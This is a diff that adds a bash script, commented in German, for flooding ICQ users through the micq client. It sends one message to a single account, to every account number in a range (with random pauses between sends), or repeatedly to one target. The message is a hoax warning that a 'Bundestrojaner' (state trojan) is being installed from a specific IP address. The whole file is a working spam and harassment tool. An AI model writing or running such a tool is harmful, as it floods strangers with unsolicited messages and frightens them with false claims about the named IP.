@@ -1,0 +1,111 @@
+#!/bin/bash
+#icq flooder
+#schickt text an alle icq nummern
+ if [ ! -n "`which micq`" ]    #micq installiert?
+  then echo sorry
+   echo "micq not found."
+   exit
+fi
+######################config####################
+MESSAGE="Bundestrojaner wird installiert von der IP 217.7.176.25 "   #messagetext der versendet wird
+UIN="1"                                       #startUIN default
+MICQ="/home/alex/.micq/scripting"             #micq user verzeichnis
+COUNTER="0"
+###############################################
+clear
+ if [ "$1" = "" ]
+  then
+   echo "usage: $0 -h for help"
+   exit
+fi
+
+
+if [ "$1" = "-f" ]
+ then
+  if [ "$3" = "" ]
+   then
+    echo "icq flooding"
+    echo "usage: $0 -f <startUIN> <endUIN> "
+    exit
+fi
+UIN="$2"
+echo "starting..."
+expr $3 - $2 
+while [ $UIN -le $3 ]
+ do
+  echo "msg $UIN $MESSAGE" > $MICQ
+  echo -e "MSG $COUNTER an $UIN senden....  [\033[1;32mOK\033[0m]"
+  UIN="$[$UIN +1]"
+  COUNTER="$[$COUNTER +1]"
+  SLEEP=$[$RANDOM % 10 + 1]
+  echo "$SLEEP sekunden warten"
+sleep $SLEEP
+done
+echo "$COUNTER messages versendet"
+exit
+fi
+
+
+
+
+if [ "$1" = "-o" ]
+ then
+  UIN="$2"
+  echo "msg $UIN $MESSAGE" > $MICQ
+  echo -e "MSG an $UIN senden....  [\033[1;32mOK\033[0m]"
+  exit
+
+fi
+
+
+
+if [ "$1" = "-r" ]
+ then
+ if [ "$2" = "" ]
+   then
+    echo "icq flooding"
+    echo "usage: $0 -r <UIN> <whg> "
+    echo "usage: $0 -r 123456789 10 #sendet 10 nachrichten"
+  exit
+fi
+
+i="0"
+UIN="$2"
+echo "starting...$2"
+
+while [ $i -le $3 ]
+ do
+  echo "msg $UIN $MESSAGE" > $MICQ
+  echo -e "MSG an $UIN senden....  [\033[1;32mOK\033[0m]"
+  i="$[$i +1]"
+echo $i
+sleep 1
+done
+echo "$COUNTER messages versendet"
+exit
+fi
+
+
+
+
+
+
+
+
+
+
+
+
+
+if [ "$1" = "-h" ]
+ then
+  echo "$0 -f <startUIN> <endUIN>   #sendet eine nachricht von der startUIN bis zur endUIN"
+  echo "$0 -o <UIN>                  #sendet eine nachricht an diese eine UIN"
+  echo "$0 -r <UIN>  <whg>           #sendet viele nachrichten an diese eine UIN"
+   
+exit
+fi
+
+
+
+
